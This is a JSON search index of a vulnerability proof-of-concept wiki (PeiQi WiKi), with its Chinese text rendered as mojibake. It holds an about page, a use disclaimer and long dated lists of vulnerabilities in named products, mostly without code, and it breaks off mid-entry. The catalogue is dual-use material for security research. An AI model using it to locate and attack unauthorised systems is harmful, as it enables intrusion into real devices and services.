{"./":{"url":"./","title":"å…³äºæ–‡åº“","keywords":"","body":"PeiQi WiKi-POCæ–‡åº“ğŸ‘ å…³äºæ–‡åº“ å¦‚ä»Šæ¼æ´çš„å„ç§å¤ç°æ–‡ç« å·²ç»å¡«æ»¡äº†äº’è”ç½‘ï¼Œä½†æ˜¯æ¯æ¬¡å»å°è¯•æ¼æ´å¤ç°æ—¶ï¼Œæ€»ä¼šçº ç»“äºç¯å¢ƒæ­å»ºï¼ŒPOCå’Œæ¼æ´åŸç†ä¸Šã€‚ ç”±äºè¿™äº›å› ç´ ï¼Œé€šå¸¸éƒ½éœ€è¦ç¿»é˜…å¾ˆå¤šå¾ˆå¤šçš„æ–‡ç« æ‰èƒ½ç†è§£è¿™ä¸ªæ¼æ´ï¼Œäºæ˜¯ï¼Œä¾¿èŒç”Ÿäº†æŠŠç¯å¢ƒæ­å»ºï¼ŒPOCï¼Œæ¼æ´åŸç†å…¨éƒ¨é›†åˆåœ¨ä¸€ä¸ªæ–‡åº“çš„æƒ³æ³•ï¼ŒPeiQI WiKi-POCæ–‡åº“ä¾¿ç”±æ­¤è€Œæ¥ğŸ£ æƒ³è¦æŠ•ç¨¿æ–‡åº“ä¸­æ²¡æœ‰çš„æ¼æ´æ—¶ï¼Œè¯·æ‰«æä¸‹é¢çš„äºŒç»´ç åŠ æˆ‘å¤‡æ³¨æ–‡åº“æŠ•ç¨¿ï¼Œæ¬¢è¿å¸ˆå‚…ä¸€èµ·æ¥å»ºç«‹æ–‡åº“å•¦~ ä½¿ç”¨éœ€çŸ¥ ç”±äºä¼ æ’­ã€åˆ©ç”¨æ­¤æ–‡æ‰€æä¾›çš„ä¿¡æ¯è€Œé€ æˆçš„ä»»ä½•ç›´æ¥æˆ–è€…é—´æ¥çš„åæœåŠæŸå¤±ï¼Œå‡ç”±ä½¿ç”¨è€…æœ¬äººè´Ÿè´£ï¼Œæ–‡ç« ä½œè€…ä¸ä¸ºæ­¤æ‰¿æ‹…ä»»ä½•è´£ä»»ã€‚ PeiQiæ–‡åº“ æ‹¥æœ‰å¯¹æ­¤æ–‡ç« çš„ä¿®æ”¹å’Œè§£é‡Šæƒå¦‚æ¬²è½¬è½½æˆ–ä¼ æ’­æ­¤æ–‡ç« ï¼Œå¿…é¡»ä¿è¯æ­¤æ–‡ç« çš„å®Œæ•´æ€§ï¼ŒåŒ…æ‹¬ç‰ˆæƒå£°æ˜ç­‰å…¨éƒ¨å†…å®¹ã€‚æœªç»ä½œè€…å…è®¸ï¼Œä¸å¾—ä»»æ„ä¿®æ”¹æˆ–è€…å¢å‡æ­¤æ–‡ç« å†…å®¹ï¼Œä¸å¾—ä»¥ä»»ä½•æ–¹å¼å°†å…¶ç”¨äºå•†ä¸šç›®çš„ã€‚ Goby & EXP ä¸ POC ä»…ä»…åªä¾›å¯¹å·²æˆæƒçš„ç›®æ ‡ä½¿ç”¨æµ‹è¯•ï¼Œå¯¹æœªæˆæƒç›®æ ‡çš„æµ‹è¯•PeiQiæ–‡åº“ä¸æ‰¿æ‹…è´£ä»»ï¼Œå‡ç”±æœ¬äººè‡ªè¡Œæ‰¿æ‹… æœ¬æ–‡åº“ä¸­çš„æ¼æ´å‡ä¸ºå…¬å¼€çš„æ¼æ´æ”¶é›†ï¼Œå¦‚æœæ–‡åº“ä¸­çš„æ¼æ´å‡ºç°æ•æ„Ÿå†…å®¹äº§ç”Ÿäº†éƒ¨åˆ†å½±å“ï¼Œè¯·åŠæ—¶è”ç³»ä½œè€…åˆ é™¤æ¼æ´ï¼Œæœ›è°…è§£~ å…¬ä¼—å·å’Œä½œè€… [!NOTE] æ›´æ–°çš„æ–‡ç« éƒ½ä¼šåœ¨ç¬¬ä¸€æ—¶é—´æ¨é€åœ¨å…¬ä¼—å·å’Œäº¤æµç¾¤ å¦‚æœå¯¹æ–‡åº“æœ‰å»ºè®®æˆ–è€…æƒ³è¦æŒ‡å‡ºé”™è¯¯ï¼Œå¯ä»¥æ‰«ä¸€æ‰«å¾®ä¿¡åŠ æˆ‘å¥½å‹ğŸ§ å¦‚æœæƒ³è¦åŠ å…¥äº¤æµç¾¤ï¼Œè¿›å…¥å…¬ä¼—å·ç‚¹å‡»äº¤æµç¾¤ åŠ è¿ç»´å°å“¥å“¥æ‹‰ä½ å•¦ğŸ§ çŸ¥è¯†æ˜Ÿçƒ å…³äºå›¢é˜Ÿ å›¢é˜Ÿå®˜ç½‘ å…¬å¼€çŸ¥è¯†åº“ å…¬å¼€pocæ–‡åº“ CTFå¹³å° å…¬å¼€ç¤¾åŒº å…¬å¼€ç›˜ çŸ¥è¯†åº“å¯¼èˆª å…³äºä½¿ç”¨ æ–‡åº“ä½¿ç”¨çš„æ˜¯Gitbookï¼Œå› ä¸ºé£æ ¼æ¯”è¾ƒæ¸…æ–°ï¼Œç®€æ´ã€‚äºæ˜¯ä¾¿é€‰æ‹©äº†å®ƒæ¥æ­å»ºæ–‡åº“ã€‚ ç›®å‰Wikiæ–‡åº“æ˜¯å¼€æºçš„ï¼Œæ¯ä¸€ä¸ªäººéƒ½å¯ä»¥ä¸‹è½½éšæ—¶ç¿»é˜…ğŸ¬ åœ¨çº¿æŸ¥é˜… Githubé“¾æ¥ ç äº‘é“¾æ¥ [!NOTE] POCæ–‡ä»¶éƒ½å­˜æ”¾äºæ¼æ´åˆ†ç±»åçš„POCç›®å½•ä¸­ æ‰«æå·¥å…·æ–‡ä»¶å­˜æ”¾äºæ¼æ´åˆ†ç±»åçš„Scanç›®å½•ä¸­ Goby POC å­˜æ”¾äº Goby & POCç›®å½•ä¸­ [!NOTE] ç½‘ç«™ç›®å½•ä¸Šæ–¹æ”¯æŒæ­£åˆ™æœç´¢å…³é”®å­—å¿«é€ŸæŸ¥çœ‹ [!NOTE] è¾¹æ¡†å¯ä»¥è°ƒæ•´ï¼Œå­—ä½“å¤§å°å’ŒèƒŒæ™¯ä¹Ÿæ”¯æŒæ›´æ¢ [!NOTE] Goby & POC ä¸­çš„ json æ–‡ä»¶å¯è¢«å¯¼å…¥Gobyå¿«é€ŸéªŒè¯æ¼æ´ å¦‚ä½•æœ¬åœ°ä½¿ç”¨ ä¸‹è½½Githubå…¨éƒ¨æ–‡ä»¶ï¼Œå°† _bookæ–‡ä»¶å¤¹ ä½œä¸ºç½‘ç«™æ ¹ç›®å½•æ¥æ­å»ºæ–‡åº“(æ­¤ç›®å½•ä¸ºå·²ç»ç¼–è¯‘å¥½çš„htmlæ ¼å¼) æœ€å [!NOTE] åˆ«å¿˜äº†Githubä¸‹è½½å®Œç»™ä¸ªå°æ˜Ÿæ˜Ÿâ­ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-27 22:34:45 "},"Goby & POC.html":{"url":"Goby & POC.html","title":"Goby & POC","keywords":"","body":"Goby & POC æ›´æ–°æ—¶é—´çº¿è®°å½•ğŸŸ 2021-6-17 IceWarp WebClient basic è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ 2021-6-17 Kyan ç½‘ç»œç›‘æ§è®¾å¤‡ run.php è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ 2021-6-15 TamronOS IPTVç³»ç»Ÿ ping ä»»æ„å‘½ä»¤æ‰§è¡Œæ¼æ´ 2021-6-15 Huawei HG659 lib ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ 2021-6-15 MagicFlow é˜²ç«å¢™ç½‘å…³ main.xp ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ 2021-6-15 æé€šEWEBS casmain.xgi ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ 2021-6-9 é‡‘å’ŒOA C6 download.jsp ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ 2021-6-5 ç‹®å­é±¼CMS wxapp.php ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ 2021-6-5 è¿ˆæ™® ISG1000å®‰å…¨ç½‘å…³ ä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´ 2021-6-5 D-Link ShareCenter DNS-320 system_mgr.cgi è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ 2021-6-5 é‡‘è¶OA server_file ç›®å½•éå†æ¼æ´ 2021-6-5 D-Link ShareCenter DNS-320 system_mgr.cgi è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ 2021-5-29 è“æµ·å“è¶Šè®¡è´¹ç®¡ç†ç³»ç»Ÿ debug.php è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ 2021-5-19 H3C SecParhå ¡å’æœº get_detail_view.php ä»»æ„ç”¨æˆ·ç™»å½•æ¼æ´ 2021-5-19 H3C IMC dynamiccontent.properties.xhtm è¿œç¨‹å‘½ä»¤æ‰§è¡Œ 2021-5-19 è“æµ·å“è¶Šè®¡è´¹ç®¡ç†ç³»ç»Ÿ download.php ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ 2021-5-18 ç‹®å­é±¼CMS ApigoodController.class.php SQLæ³¨å…¥æ¼æ´ 2021-5-18 ç‹®å­é±¼CMS ApiController.class.php SQLæ³¨å…¥æ¼æ´ 2021-5-18 D-Link Dir-645 getcfg.php è´¦å·å¯†ç æ³„éœ²æ¼æ´ CVE-2019-17506 2021-5-18 Selea OCR-ANPRæ‘„åƒæœº SeleaCamera ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ 2021-5-18 Selea OCR-ANPRæ‘„åƒæœº get_file.php ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ 2021-5-18 å¯è±OA CloseMsg.aspx SQLæ³¨å…¥æ¼æ´ 2021-5-18 ä¼šæ·é€šäº‘è§†è®¯ list ç›®å½•æ–‡ä»¶æ³„éœ²æ¼æ´ 2021-5-18 ä¼šæ·é€šäº‘è§†è®¯ fileDownload ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ 2021-5-18 ACTI è§†é¢‘ç›‘æ§ ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ 2021-4-14 Coremail é…ç½®ä¿¡æ¯æ³„éœ²æ¼æ´ 2021-4-12 SonarQube api ä¿¡æ¯æ³„éœ²æ¼æ´ CVE-2020-27986 2021-4-12 æµªæ½®ClusterEngineV4.0 sysShell ä»»æ„å‘½ä»¤æ‰§è¡Œæ¼æ´ 2021-4-12 é‡‘å±± V8 ç»ˆç«¯å®‰å…¨ç³»ç»Ÿ é»˜è®¤å¼±å£ä»¤æ¼æ´ 2021-4-9 ç”¨å‹ERP-NC ç›®å½•éå†æ¼æ´ 2021-4-9 äº¿é‚®ç”µå­é‚®ä»¶ç³»ç»Ÿ è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ 2021-4-9 é½æ²»å ¡å’æœº ä»»æ„ç”¨æˆ·ç™»å½•æ¼æ´ 2021-4-8 æ³›å¾®OA V8 SQLæ³¨å…¥æ¼æ´ 2021-4-8 å¤©æ“ æ•°æ®åº“ä¿¡æ¯æ³„éœ²æ¼æ´ 2021-4-7 VMware vRealize Operations Manager SSRFæ¼æ´ CVE-2021-21975 2021-4-6 Jellyfin ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ CVE-2021-21402 2021-4-5 è‡´è¿œOA A6 initDataAssess.jsp ç”¨æˆ·æ•æ„Ÿä¿¡æ¯æ³„éœ² 2021-4-4 é”æ·Smartwebç®¡ç†ç³»ç»Ÿ å¯†ç ä¿¡æ¯æ³„éœ²æ¼æ´ 2021-4-4 é”æ·Smartwebç®¡ç†ç³»ç»Ÿ é»˜è®¤å¼€å¯Guestè´¦æˆ·æ¼æ´ 2021-4-4 é“¶æ¾äº‘è®¡ç®— å¥½è§†é€šè§†é¢‘ä¼šè®®ç³»ç»Ÿ ä»»æ„æ–‡ä»¶ä¸‹è½½ 2021-4-3 ICEFlow VPN ä¿¡æ¯æ³„éœ²æ¼æ´ 2021-4-2 é‡‘å’ŒOA C6 ç®¡ç†å‘˜é»˜è®¤å£ä»¤ 2021-4-1 æµªæ½®ClusterEngineV4.0 è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ CVE-2020-21224 2021-3-31 ä¸‰æ˜Ÿ WLAN AP WEA453eè·¯ç”±å™¨ è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ 2021-3-30 ä¸­æ–°é‡‘ç›¾ä¿¡æ¯å®‰å…¨ç®¡ç†ç³»ç»Ÿ é»˜è®¤è¶…çº§ç®¡ç†å‘˜å¯†ç æ¼æ´ 2021-3-29 D-Link DCSç³»åˆ—ç›‘æ§ è´¦å·å¯†ç ä¿¡æ¯æ³„éœ²æ¼æ´ CVE-2020-25078 2021-3-29 Apache Solr ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ 2021-3-22 MessageSolution é‚®ä»¶å½’æ¡£ç³»ç»ŸEEA ä¿¡æ¯æ³„éœ²æ¼æ´ CNVD-2021-10543 2021-3-21 å¸†è½¯æŠ¥è¡¨ v8.0 ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ CNVD-2018-04757 2021-3-18 è‡´è¿œOA getSessionList.jsp Sessionæ³„æ¼æ¼æ´ 2021-3-18 è‡´è¿œOA A6 DownExcelBeanServlet ç”¨æˆ·æ•æ„Ÿä¿¡æ¯æ³„éœ² 2021-3-17 XXL-JOB ä»»åŠ¡è°ƒåº¦ä¸­å¿ƒ åå°é»˜è®¤å¼±å£ä»¤ 2021-3-13 Microsoft Exchange SSRFæ¼æ´ CVE-2021-26885 2021-3-9 GitLab Graphqlé‚®ç®±ä¿¡æ¯æ³„éœ²æ¼æ´ CVE-2020-26413 2021-2-21 èœ‚ç½‘äº’è” ä¼ä¸šçº§è·¯ç”±å™¨v4.31 å¯†ç æ³„éœ²æ¼æ´ CVE-2019-16313 2021-2-7 D-Link ACé›†ä¸­ç®¡ç†ç³»ç»Ÿé»˜è®¤å¼±å£ä»¤ 2021-2-7 Wayos ACé›†ä¸­ç®¡ç†ç³»ç»Ÿé»˜è®¤å¼±å£ä»¤ CNVD-2021-00876 2021-2-6 HIKVISION è§†é¢‘ç¼–ç è®¾å¤‡æ¥å…¥ç½‘å…³ ä»»æ„æ–‡ä»¶ä¸‹è½½ 2021-1-28 Atlassian Jira ä¿¡æ¯æ³„éœ²æ¼æ´ CVE-2020-14181 2021-1-26 SonicWall SSL-VPN è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ 2021-1-26 é”æ·NBRè·¯ç”±å™¨ EWEBç½‘ç®¡ç³»ç»Ÿ è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ 2021-1-25 è‡´è¿œOA webmail.doä»»æ„æ–‡ä»¶ä¸‹è½½ CNVD-2020-62422 2021-1-25 Alibaba Nacos æ§åˆ¶å°é»˜è®¤å¼±å£ä»¤ 2021-1-25 Alibaba Nacos æœªæˆæƒè®¿é—®æ¼æ´ 2021-1-24 Apache Kylin Console æ§åˆ¶å°å¼±å£ä»¤ 2021-1-24 Apache Kylin æœªæˆæƒé…ç½®æ³„éœ² CVE-2020-13937 2021-1-24 Laravel .env é…ç½®æ–‡ä»¶æ³„éœ² CVE-2017-16894 2021-1-23 Weblogic SSRFæ¼æ´ CVE-2014-4210 2021-1-22 Apache Cocoon Xml æ³¨å…¥ CVE-2020-11991 2021-1-22 Weblogic_LDAP_RCE_CVE_2021_2109 2021-1-21 Weblogic LDAP è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2021-2109 2021-1-21 Lanproxy ç›®å½•éå†æ¼æ´ CVE-2021-3019 PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-17 22:50:17 "},"TIME.html":{"url":"TIME.html","title":"æ›´æ–°æ—¶é—´çº¿è®°å½•","keywords":"","body":"æ–‡åº“æ›´æ–°æ—¶é—´çº¿è®°å½•ğŸ¦„ 2021-7-4 Node-RED ui_base ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ 2021-7-2 PbootCMS search SQLæ³¨å…¥æ¼æ´ 2021-7-2 PbootCMS ext_price SQLæ³¨å…¥æ¼æ´ 2021-7-2 DocCMS keyword SQLæ³¨å…¥æ¼æ´ 2021-6-29 OpenSNS shareBox è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ 2021-6-28 Nexus Repository Manger extdirect è¿œç¨‹å‘½ä»¤æ‰§è¡Œ CVE-2019-7238 2021-6-28 Nexus Repository Manger group åå°è¿œç¨‹å‘½ä»¤æ‰§è¡Œ CVE-2020-10199 2021-6-28 Nexus Repository Manger group åå°è¿œç¨‹å‘½ä»¤æ‰§è¡Œ CVE-2020-10204 2021-6-28 Nexus Repository Manger change-password ä½æƒé™ä¿®æ”¹ç®¡ç†å‘˜å¯†ç æ¼æ´ CVE-2020-11444 2021-6-27 GitLab SSRFæ¼æ´ CVE-2021-22214 2021-6-27 å¤©èä¿¡è´Ÿè½½å‡è¡¡TopApp-LB enable_tool_debug.php è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ 2021-6-27 Active UC index.action è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ 2021-6-27 H3C SecParh å ¡å’æœº data_provider.php è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ 2021-6-27 ä¸­å›½ç§»åŠ¨ ç¦¹è·¯ç”± ExportSettings.sh æ•æ„Ÿä¿¡æ¯æ³„éœ²æ¼æ´ 2021-6-27 ä¸­å›½ç§»åŠ¨ ç¦¹è·¯ç”± simple-index.asp è¶Šæƒè®¿é—®æ¼æ´ 2021-6-17 IceWarp WebClient basic è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ 2021-6-17 Kyan ç½‘ç»œç›‘æ§è®¾å¤‡ run.php è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ 2021-6-15 TamronOS IPTVç³»ç»Ÿ ping ä»»æ„å‘½ä»¤æ‰§è¡Œæ¼æ´ 2021-6-15 TamronOS IPTVç³»ç»Ÿ submit ä»»æ„ç”¨æˆ·åˆ›å»ºæ¼æ´ 2021-6-15 Huawei HG659 lib ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ 2021-6-15 æé€šEWEBS casmain.xgi ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ 2021-6-15 æé€šEWEBS testweb.php æ•æ„Ÿä¿¡æ¯æ³„éœ²æ¼æ´ 2021-6-15 MagicFlow é˜²ç«å¢™ç½‘å…³ main.xp ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ 2021-6-9 é‡‘å’ŒOA C6 download.jsp ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ 2021-6-7 ä¹…å…¶è´¢åŠ¡æŠ¥è¡¨ download.jsp ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ 2021-6-5 è¿ˆæ™® ISG1000å®‰å…¨ç½‘å…³ ä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´ 2021-6-5 H3C SecPath ä¸‹ä¸€ä»£é˜²ç«å¢™ ä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´ 2021-6-5 D-Link ShareCenter DNS-320 system_mgr.cgi è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ 2021-6-4 é‡‘è¶OA server_file ç›®å½•éå†æ¼æ´ 2021-6-2 å‘è´§100 M_id SQLæ³¨å…¥æ¼æ´ CNVD-2021-30193 2021-6-2 ä¸­ç§‘ç½‘å¨ ä¸‹ä¸€ä»£é˜²ç«å¢™æ§åˆ¶ç³»ç»Ÿ download.php ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ 2021-6-2 ShopXO download ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ CNVD-2021-15822 2021-6-1 äº¿èµ›é€š ç”µå­æ–‡æ¡£å®‰å…¨ç®¡ç†ç³»ç»Ÿ dataimport è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ 2021-5-31 å›¾åˆ›è½¯ä»¶ å›¾ä¹¦é¦†ç«™ç¾¤ç®¡ç†ç³»ç»Ÿ ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ 2021-5-31 Wayos é˜²ç«å¢™ è´¦å·å¯†ç æ³„éœ²æ¼æ´ 2021-5-31 Wayos é˜²ç«å¢™ åå°å‘½ä»¤æ‰§è¡Œæ¼æ´ 2021-5-31 ç”¨å‹ NC bsh.servlet.BshServlet è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ 2021-5-31 æ·±ä¿¡æœ è¡Œä¸ºæ„ŸçŸ¥ç³»ç»Ÿ c.php è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ 2021-5-31 æ·±ä¿¡æœ æ—¥å¿—ä¸­å¿ƒ c.php è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ 2021-5-31 é”æ·ISG è´¦å·å¯†ç æ³„éœ²æ¼æ´ 2021-5-31 ä¸­ç§‘ç½‘å¨ ä¸‹ä¸€ä»£é˜²ç«å¢™æ§åˆ¶ç³»ç»Ÿ è´¦å·å¯†ç æ³„éœ²æ¼æ´ 2021-5-31 iKuai æµæ§è·¯ç”± SQLæ³¨å…¥æ¼æ´ 2021-5-21 ç½‘åº· NS-ASGå®‰å…¨ç½‘å…³ ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ 2021-5-21 ACTI è§†é¢‘ç›‘æ§ ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ 2021-5-20 è“æµ·å“è¶Šè®¡è´¹ç®¡ç†ç³»ç»Ÿ debug.php è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ 2021-5-19 æ±‰ç‹äººè„¸è€ƒå‹¤ç®¡ç†ç³»ç»Ÿ Check SQLæ³¨å…¥æ¼æ´ 2021-5-18 Cisco ASAè®¾å¤‡ä»»æ„æ–‡ä»¶åˆ é™¤æ¼æ´ CVE-2020-3187 2021-5-18 Cisco HyperFlex HX storfs-asup è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ CVE-2021-1497 2021-5-18 Cisco HyperFlex HX upload ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ CVE-2021-1499 2021-5-18 ä¼šæ·é€šäº‘è§†è®¯ fileDownload ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ 2021-5-18 ä¼šæ·é€šäº‘è§†è®¯ ç™»å½•ç»•è¿‡æ¼æ´ 2021-5-17 æ³›å¾®OA weaver.common.Ctrl ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ 2021-5-16 å¯è±OA messageurl.aspx SQLæ³¨å…¥æ¼æ´ 2021-5-16 å¯è±OA treelist.aspx SQLæ³¨å…¥æ¼æ´ 2021-5-16 å¯è±OA CloseMsg.aspx SQLæ³¨å…¥æ¼æ´ 2021-5-16 Selea OCR-ANPRæ‘„åƒæœº SeleaCamera ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ 2021-5-15 Selea OCR-ANPRæ‘„åƒæœº get_file.php ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ 2021-5-16 D-Link Dir-645 getcfg.php è´¦å·å¯†ç æ³„éœ²æ¼æ´ CVE-2019-17506 2021-5-15 å¿ƒç†æµ‹é‡å¹³å° ç›®å½•éå†æ¼æ´ CNVD-2021-01929 2021-5-15 ZeroShell 3.9.0 è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ CVE-2019-12725 2021-5-14 ç‹®å­é±¼CMS wxapp.php ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ 2021-5-14 ç‹®å­é±¼CMS image_upload.php ä»»æ„æ–‡ä»¶ä¸Šä¼  2021-5-14 ç‹®å­é±¼CMS ApigoodController.class.php SQLæ³¨å…¥æ¼æ´ 2021-5-14 ç‹®å­é±¼CMS ApiController.class.php SQLæ³¨å…¥æ¼æ´ 2021-5-12 æ³›å¾®E-Cology WorkflowServiceXml RCE 2021-5-12 H3C IMC dynamiccontent.properties.xhtm è¿œç¨‹å‘½ä»¤æ‰§è¡Œ 2021-5-12 è“æµ·å“è¶Šè®¡è´¹ç®¡ç†ç³»ç»Ÿ download.php ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ 2021-5-12 TVTæ•°ç ç§‘æŠ€ NVMS-1000 è·¯å¾„éå†æ¼æ´ 2021-5-11 ç¢§æµ·å¨ L7å¤šæ¬¾äº§å“ åå°å‘½ä»¤æ‰§è¡Œæ¼æ´ 2021-5-9 FLIR-AX8 download.php ä»»æ„æ–‡ä»¶ä¸‹è½½ 2021-5-8 ä¼šæ·é€šäº‘è§†è®¯ list ç›®å½•æ–‡ä»¶æ³„éœ²æ¼æ´ 2021-5-8 PHPUnit eval-stdin.php è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ 2021-5-8 è“å‡ŒOA SSRF+JNDIè¿œç¨‹å‘½ä»¤æ‰§è¡Œ 2021-5-8 VoIPmonitor è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ CVE-2021-30461 2021-5-8 ç”µä¿¡å¤©ç¿¼ç½‘å…³F460 web_shell_cmd.gch è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ 2021-5-5 rConfig ajaxEditTemplate.php åå°è¿œç¨‹å‘½ä»¤æ‰§è¡Œ 2021-5-4 ç”µä¿¡ä¸­å…´ZXHN F450Aç½‘å…³ é»˜è®¤ç®¡ç†å‘˜è´¦å·å¯†ç æ¼æ´ 2021-5-4 rConfig ajaxArchiveFiles.php åå°è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ 2021-5-4 rConfig useradmin.inc.php ä¿¡æ¯æ³„éœ²æ¼æ´ 2021-5-4 rConfig userprocess.php ä»»æ„ç”¨æˆ·åˆ›å»ºæ¼æ´ 2021-5-3 KEADCOM æ•°å­—ç³»ç»Ÿæ¥å…¥ç½‘å…³ ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ 2021-5-3 Intelbras Wireless æœªæˆæƒä¸å¯†ç æ³„éœ² CVE-2021-3017 2021-5-3 Alibaba Canal config äº‘å¯†é’¥ä¿¡æ¯æ³„éœ²æ¼æ´ 2021-5-3 åŸåˆ›å…ˆé”‹ åå°ç®¡ç†å¹³å° æœªæˆæƒè®¿é—®æ¼æ´ 2021-5-3 H3C SecParhå ¡å’æœº get_detail_view.php ä»»æ„ç”¨æˆ·ç™»å½•æ¼æ´ 2021-5-3 ezEIP 4.1.0 ä¿¡æ¯æ³„éœ²æ¼æ´ 2021-5-2 å®‰ç¾æ•°å­— é…’åº—å®½å¸¦è¿è¥ç³»ç»Ÿ server_ping.php è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ 2021-5-2 é˜¿å°”æ³•ç§‘æŠ€ è™šæ‹Ÿä»¿çœŸå®éªŒå®¤ æœªæˆæƒè®¿é—®æ¼æ´ 2021-5-2 é”æ·NBR 1300Gè·¯ç”±å™¨ è¶ŠæƒCLIå‘½ä»¤æ‰§è¡Œæ¼æ´ 2021-5-2 é”æ·EGæ˜“ç½‘å…³ phpinfo.view.php ä¿¡æ¯æ³„éœ²æ¼æ´ 2021-5-2 é”æ·EGæ˜“ç½‘å…³ download.php ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ 2021-5-1 é”æ·EGæ˜“ç½‘å…³ branch_passw.php è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ 2021-5-1 é”æ·EGæ˜“ç½‘å…³ ç®¡ç†å‘˜è´¦å·å¯†ç æ³„éœ²æ¼æ´ 2021-5-1 é”æ·EGæ˜“ç½‘å…³ cli.php è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ 2021-5-1 TerraMaster TOS RCE CVE-2020-28188 2021-5-1 TerraMaster TOS åå°ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ CVE-2020-28187 2021-5-1 TerraMaster TOS exportUser.php è¿œç¨‹å‘½ä»¤æ‰§è¡Œ CVE-2020-15568 2021-5-1 TerraMaster TOS ä»»æ„è´¦å·å¯†ç ä¿®æ”¹æ¼æ´ CVE-2020-28186 2021-5-1 TerraMaster TOS ç”¨æˆ·æšä¸¾æ¼æ´ CVE-2020-28185 2021-5-1 è“å‡ŒOA custom.jsp ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ 2021-5-1 Panabit iXCache cfg_cmd åå°å‘½ä»¤æ‰§è¡Œæ¼æ´ 2021-5-1 Panabit Panalog cmdhandle.php åå°å‘½ä»¤æ‰§è¡Œæ¼æ´ 2021-5-1 Panabit æ™ºèƒ½åº”ç”¨ç½‘å…³ ajax_top åå°å‘½ä»¤æ‰§è¡Œæ¼æ´ 2021-4-29 E-message è¶Šæƒè®¿é—®æ¼æ´ 2021-4-29 é”æ·äº‘è¯¾å ‚ä¸»æœº ç›®å½•éå†æ¼æ´ 2021-4-29 å®ç”µ H8922 åå°ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ CVE-2021-28152 2021-4-29 å®ç”µ H8922 åå°ç®¡ç†å‘˜ä¿¡æ¯æ³„éœ²æ¼æ´ CVE-2021-28151 2021-4-29 å®ç”µ H8922 åå°å‘½ä»¤æ‰§è¡Œæ¼æ´ CVE-2021-28150 2021-4-29 å®ç”µ H8922 Telnetåé—¨æ¼æ´ CVE-2021-28149 2021-4-24 æ–°ç‚¹OA æ•æ„Ÿä¿¡æ¯æ³„éœ²æ¼æ´ 2021-4-24 ç”¨å‹ NCCloud FSæ–‡ä»¶ç®¡ç†SQLæ³¨å…¥ 2021-4-24 ç”¨å‹ U8 OA test.jsp 